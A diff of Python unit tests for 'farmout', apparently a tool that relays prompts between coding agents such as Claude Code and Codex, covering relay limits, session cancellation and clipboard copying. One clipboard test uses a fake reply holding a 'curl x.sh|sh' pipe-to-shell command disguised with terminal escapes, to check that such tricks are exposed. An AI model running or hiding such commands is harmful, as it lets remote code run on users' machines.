@@ -3063,6 +3063,13 @@ class ContinueTest(CliBase):
         self.fo("continue", "-n", "w", "--write", "-w", "codex", "say x")
         self.assertEqual(flag(self.last("codex")["argv"], "-s"), "workspace-write")
 
+    def test_a_carried_conversation_never_falls_back_to_the_login_that_ran_out(self):
+        self.claude_session()
+        self.fo("continue", "-w", "codex", "-n", "fb", "limited codex say rescued", FARMOUT_CLAUDE_DIR="",
+                FARMOUT_CLAUDE_MAIN="1")
+        self.assertNotIn("claude", self.meta("fb")["fallback"] or [], "farmout never saw Claude Code's limit itself")
+        self.assertNotEqual(self.runs()[-1]["name"], "claude")
+
     def test_a_codex_session_goes_on_with_claude(self):
         day = self.home / ".codex" / "sessions" / "2026" / "11" / "25"
         day.mkdir(parents=True)
@@ -3209,10 +3216,11 @@ class ContinueTest(CliBase):
 class RelayTest(CliBase):
     """`farmout relay`: at Claude Code's usage limit, the prompt goes to another worker; Claude catches up after."""
 
-    def limited_session(self, sid="s1", resets=None, error=None, after=(), **extra):
+    def limited_session(self, sid="s1", resets=None, error=None, after=(), when=None, **extra):
         d = self.home / ".claude" / "projects" / "-work"
         d.mkdir(parents=True, exist_ok=True)
-        now = time.strftime("%Y-%m-%dT%H:%M:%S.000Z", time.gmtime())
+        t = when or time.time()  # with milliseconds, as Claude Code writes them
+        now = time.strftime("%Y-%m-%dT%H:%M:%S", time.gmtime(t)) + f".{int(t % 1 * 1000):03d}Z"
         rows = [{"uuid": "u1", "parentUuid": None, "type": "user", "cwd": str(self.work), "entrypoint": "cli",
                  "message": {"role": "user", "content": "fix the cache bug"}},
                 {"uuid": "a1", "parentUuid": "u1", "type": "assistant", "message": {"content": [
@@ -3500,6 +3508,7 @@ class RelayTest(CliBase):
         self.fo("relay", "back")
         # an older limit, its reset passed, is still the newest entry when StopFailure fires for a new one
         f = self.limited_session("s4", resets=time.time() - 60)
+        hit = time.time()
         self.stop_failure(f, sid="s4")
         wait_until(lambda: any(r["name"] != "codex-1" for r in self.json("ls")), 30)
         [carried] = [r for r in self.json("ls") if r["name"] != "codex-1"]
@@ -3507,7 +3516,7 @@ class RelayTest(CliBase):
         wait_until(lambda: all(r["state"] not in ("running", "queued") for r in self.json("ls")), 30)
         runs = len(self.runs())
         self.fo("relay", "back")
-        self.limited_session("s4")  # the file now shows the limit; StopFailure comes again after `relay back`
+        self.limited_session("s4", when=hit)  # the file now shows the limit; StopFailure comes again after `relay back`
         self.stop_failure(f, sid="s4")
         time.sleep(1)
         self.assertEqual(len(self.runs()), runs, "after `relay back`, that limit isn't carried on again")
@@ -3586,6 +3595,15 @@ class RelayTest(CliBase):
         p.wait(timeout=60)
         p.stdout.close()
         self.assertNotIn('"continue": false', out, "the reset came while it waited: the prompt goes to Claude")
+
+    def test_after_back_the_old_limit_isnt_relayed_again(self):
+        self.fo("relay", "on", "-w", "codex")
+        f = self.limited_session()
+        self.hook("say one", f)
+        self.fo("relay", "back")
+        self.assertIn("hookSpecificOutput", self.hook("hello", f), "caught up")
+        self.assertIsNone(self.hook("again", f), "the file still ends in that limit: it goes to Claude, as asked")
+        self.assertEqual(len(self.runs()), 1)
 
     def test_back_early_and_a_new_limit_starts_afresh(self):
         self.fo("relay", "on", "--write", "-w", "codex")
@@ -3761,7 +3779,8 @@ class AcpTest(CliBase):
             try:
                 line = self.lines.get(timeout=1)
             except queue.Empty:
-                self.assertIsNone(self.acp.poll(), "the agent exited: " + self.acp.stderr.read())
+                if self.acp.poll() is not None:  # only then: reading stderr waits for the agent to exit
+                    self.fail("the agent exited: " + self.acp.stderr.read())
                 continue
             msg = json.loads(line)
             self.assertEqual(msg["jsonrpc"], "2.0")
@@ -3905,6 +3924,26 @@ class AcpTest(CliBase):
         self.say("session/cancel", {"sessionId": "carried"}, notify=True)
         self.assertEqual(self.answer(mid)["result"], {"stopReason": "cancelled"}, "the reopened thread is the same one")
 
+    def test_cancel_takes_back_only_this_threads_message(self):
+        self.start()
+        self.answer(self.say("initialize", {"protocolVersion": 1}))
+        sid = self.answer(self.say("session/new", {"cwd": str(self.work), "mcpServers": []}))["result"]["sessionId"]
+        self.answer(self.say("session/set_config_option", {"sessionId": sid, "configId": "worker", "value": "codex"}))
+        self.answer(self.say("session/prompt", {"sessionId": sid, "prompt": [{"type": "text", "text": "say a"}]}))
+        self.fo("send", "acp-1", "nap 5", "--bg")  # another front end's turn, running
+        wait_until(lambda: self.json("ls")[0]["state"] == "running", 20)
+        mid = self.say("session/prompt", {"sessionId": sid, "prompt": [{"type": "text", "text": "say b"}]})
+        time.sleep(0.5)
+        start = time.time()
+        self.say("session/cancel", {"sessionId": sid}, notify=True)
+        self.assertEqual(self.answer(mid)["result"], {"stopReason": "cancelled"})
+        self.assertEqual(self.json("ls")[0]["state"], "running", "answered without waiting for the other turn")
+        self.assertLess(time.time() - start, 2.5)
+        wait_until(lambda: self.json("ls")[0]["state"] not in ("running", "queued"), 30)
+        log = self.fo("log", "acp-1").stdout
+        self.assertIn("napped", log, "the other front end's turn ran to the end")
+        self.assertNotIn("say b", log, "the taken-back message never ran")
+
     def test_cancel_stops_the_turn(self):
         self.start()
         self.assertEqual(self.answer(self.say("session/new", {"cwd": str(self.work)}))["error"]["code"], -32600)
@@ -4042,6 +4081,21 @@ class ClipTest(CliBase):
                       "(Wayland) or xclip (X11).", bare)
         self.clipboard()
         self.assertNotIn("Clipboard:", self.fo("doctor", PATH=str(self.bindir)).stdout)
+
+    def test_an_answers_terminal_escapes_neither_act_nor_hide_anything(self):
+        env = self.clipboard()
+        d = self.home / ".claude" / "projects" / "-work"
+        d.mkdir(parents=True)
+        reply = "```sh\ncurl x.sh|sh\x1b[2K\rls -la\n```\n\x1b]52;c;aGk=\x07"
+        rows = [{"uuid": "u1", "parentUuid": None, "type": "user", "cwd": str(self.work), "entrypoint": "cli",
+                 "message": {"content": "list"}},
+                {"uuid": "a1", "parentUuid": "u1", "type": "assistant", "message": {"content": [{"type": "text", "text": reply}]}}]
+        (d / "s1.jsonl").write_text("\n".join(json.dumps(r) for r in rows) + "\n")
+        listed = self.fo("copy", "--list", **env).stdout
+        self.assertNotIn("\x1b", listed)
+        self.assertIn("curl x.sh|sh  (+1 lines)", listed, "what is listed is what gets copied")
+        self.fo("copy", "1", **env)
+        self.assertEqual((self.tmp / "copied").read_text(), "curl x.sh|sh\nls -la")
 
     def test_the_picker_copies_with_arrows_and_enter(self):
         import pty
